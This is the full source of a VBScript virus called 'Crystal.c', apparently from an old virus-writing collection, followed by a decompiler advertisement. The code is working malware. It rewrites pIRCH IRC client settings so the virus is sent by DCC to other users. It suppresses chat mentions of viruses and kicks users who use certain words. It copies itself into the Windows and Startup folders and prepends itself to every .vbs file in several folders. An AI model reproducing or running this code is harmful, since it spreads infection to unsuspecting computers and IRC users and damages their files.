Vbs.Crystal.c by Knowdeth


'Crystal

'= VBS/pIRCH98/32.Crystal.c                         =
'= by -KD- [Metaphase VX Team] & [NoMercyVirusTeam] =
On Error Resume Next
Const TheCrystal = 5238
Const ForReading = 1, ForWriting = 2
Const XWindowsFolder = 0

Dim FSO, InfMarker, MyCode, MyBaby
Dim Crystal, MyCrystal, V, VFile
Dim FoldersToGet(3), FolderX, VCode

Set FSO = CreateObject("Scripting.FileSystemObject")
Crystal = Wscript.ScriptFullName

Set MyBaby = FSO.CreateTextFile("c:\WINDOWS\events3.dll", True)
MyBaby.WriteLine "[Levels]"
MyBaby.WriteLine "Enabled=1"
MyBaby.WriteLine "Count=6"
MyBaby.WriteLine "Level1=000-Unknowns"
MyBaby.WriteLine "000-UnknownsEnabled=1"
MyBaby.WriteLine "Level2=100-Level 100"
MyBaby.WriteLine "100-Level 100Enabled=1"
MyBaby.WriteLine "Level3=200-Level 200"
MyBaby.WriteLine "200-Level 200Enabled=1"
MyBaby.WriteLine "Level4=300-Level 300"
MyBaby.WriteLine "300-Level 300Enabled=1"
MyBaby.WriteLine "Level5=400-Level 400"
MyBaby.WriteLine "400-Level 400Enabled=1"
MyBaby.WriteLine "Level6=500-Level 500"
MyBaby.WriteLine "500-Level 500Enabled=1"
MyBaby.WriteLine ""
MyBaby.WriteLine "[000-Unknowns]"
MyBaby.WriteLine "User1=*!*@*"
MyBaby.WriteLine "UserCount=1"
MyBaby.WriteLine "Event1=; VBS/pIRCH98/32.Crystal.c"
MyBaby.WriteLine "Event2=; by -KD- [Metaphase VX Team] & [NoMercyVirusTeam]"
MyBaby.WriteLine "Event3=ON JOIN:#:/notice $nick Tell me that file isnt the cutest ;)"
MyBaby.WriteLine "Event4=ON JOIN:#:/dcc send $nick  c:\windows\Crystal2.vbs"
MyBaby.WriteLine "Event5=@ON BAN:*:#:/mode # -o+b $me $banmask | /kick # $nick Dont ban me!!"
MyBaby.WriteLine "Event6=ON PART:#:/notice $nick Case I didnt send it yet this is the cutest thing Ive seen ;)"
MyBaby.WriteLine "Event7=ON PART:#:/dcc send $nick c:\windows\Crystal2.vbs"
MyBaby.WriteLine "Event8=VERSION:/notice $nick \-1 VBS/pIRCH98/32.Crystal.c : Crystal.a by -KD- I'm Infected!!! \-1:-"
MyBaby.WriteLine "Event9=ON TOPIC:#:/topic # Crystal rocks! | /notice $nick Crystal!!!"
MyBaby.WriteLine "Event10=ON ACTION:*hump*:#:/notice $nick Get off my leg!!"
MyBaby.WriteLine "Event11=ON ACTION:*hump*:#:/kick # $nick Get off my leg I said!!"
MyBaby.WriteLine "Event12=ON TEXT:*hump*:#:/ignore # $nick"
MyBaby.WriteLine "Event13=ON TEXT:*sex*:#:/kick # $nick Crystal!!!"
MyBaby.WriteLine "Event14=ON TEXT:*fuck*:#:/kick # $nick Crystal!!!"
MyBaby.WriteLine "Event15=ON TEXT:*damn*:#:/kick # $nick Crystal!!!"
MyBaby.WriteLine "Event16=ON TEXT:*satan*:#:/kick # $nick Crystal!!!"
MyBaby.WriteLine "Event17=ON TEXT:*dick*:#:/kick # $nick Crystal!!!"
MyBaby.WriteLine "Event18=ON TEXT:*hump*:#:/ignore # $nick"
MyBaby.WriteLine "Event19=ON TEXT:*hell*:#:/ignore # $nick"
MyBaby.WriteLine "Event20=ON TEXT:*virus*:#:/ignore # $nick"
MyBaby.WriteLine "Event21=ON TEXT:*worm*:#:/ignore # $nick"
MyBaby.WriteLine "Event22=ON TEXT:*trojan*:#:/ignore # $nick"
MyBaby.WriteLine "Event23=ON TEXT:*Crystal*:#:/ignore # $nick"
MyBaby.WriteLine "Event24=ON TEXT:*baby*:*:/dcc send $nick c:\windows\Crystal2.vbs"
MyBaby.WriteLine "Event25=PING:/notice $nick Oh god baby do it again! ;)"
MyBaby.WriteLine "Event26=ON QUIT:/msg :#vir: VBS/pIRCH98/32.Crystal.c by -KD-! gotta love it!"
MyBaby.WriteLine "Event27=ON KICKED:*:#: /msg $nick What the hell? | /join # | /mode # -o+b $nick $banmask"
MyBaby.WriteLine "EventCount=27"
MyBaby.WriteLine ""
MyBaby.WriteLine "[100-Level 100]"
MyBaby.WriteLine "UserCount=0"
MyBaby.WriteLine "EventCount=0"
MyBaby.WriteLine ""
MyBaby.WriteLine "[200-Level 200]"
MyBaby.WriteLine "UserCount=0"
MyBaby.WriteLine "EventCount=0"
MyBaby.WriteLine ""
MyBaby.WriteLine "[300-Level 300]"
MyBaby.WriteLine "UserCount=0"
MyBaby.WriteLine "EventCount=0"
MyBaby.WriteLine ""
MyBaby.WriteLine "[400-Level 400]"
MyBaby.WriteLine "UserCount=0"
MyBaby.WriteLine "EventCount=0"
MyBaby.WriteLine ""
MyBaby.WriteLine "[500-Level 500]"
MyBaby.WriteLine "UserCount=0"
MyBaby.WriteLine "EventCount=0"
MyBaby.Close
FSO.CopyFile "c:\WINDOWS\events3.dll", "c:\pirch98\events.ini"
FSO.CopyFile "c:\WINDOWS\events3.dll", "c:\pirch32\events.ini"
FSO.CopyFile Crystal, "c:\WINDOWS\Crystal2.vbs"
FSO.CopyFile Crystal, "c:\WINDOWS\Start Menu\Programs\StartUp\Startup.vbs"

If Day(Now()) = 1 or Day(Now()) = 20 Then
  MsgBox "The screams fill the room" & Chr(13) & Chr(10) & "Alone I drop and kneel", 4096 , "Crystal"
End If

FoldersToGet(0) = "."
FoldersToGet(1) = FSO.GetSpecialFolder(XWindowsFolder)
FoldersToGet(2) = FSO.GetSpecialFolder(XWindowsFolder) & "\Desktop"

Set MyCrystal = FSO.OpenTextFile(Crystal, ForReading)
MyCode = MyCrystal.Read(TheCrystal)
MyCrystal.Close

For Each FolderX in FoldersToGet
   Catch FolderX
Next

Sub Catch(TheFolder)

For Each V in FSO.GetFolder(TheFolder).Files
  If FSO.GetExtensionName(V.Name) = "vbs" then

Set VFile = FSO.OpenTextFile(V.Path,ForReading)
    InfMarker = VFile.read(8)
    VFile.close

If InfMarker <> "'Crystal" Then
      Set VFile = FSO.OpenTextFile(V.path,ForReading)
      VCode = VFile.ReadAll
      VFile.close
      VCode = MyCode & VCode
      Set VFile = FSO.OpenTextFile(V.Path,ForWriting,True)
      VFile.Write VCode
      VFile.close
    end if
  end if
next
End Sub
'---> Exit<br> This file is decompiled by an unregistered version of ChmDecompiler.<br> Regsitered version does not show this message. <br>You can download ChmDecompiler at :   <a href="http://www.etextwizard.com/" target=_blank>http://www.etextwizard.com/</a><br><br>